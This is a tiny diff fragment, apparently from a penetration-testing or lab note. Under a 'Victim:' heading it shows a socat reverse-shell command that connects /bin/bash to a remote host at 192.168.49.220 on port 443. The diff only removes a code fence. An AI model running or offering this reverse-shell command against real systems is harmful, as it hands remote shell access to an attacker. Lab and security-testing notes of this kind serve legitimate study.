@@ -45,6 +45,6 @@ Victim:
         socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:192.168.49.220:443
         
         
-        ```
+        
        
        
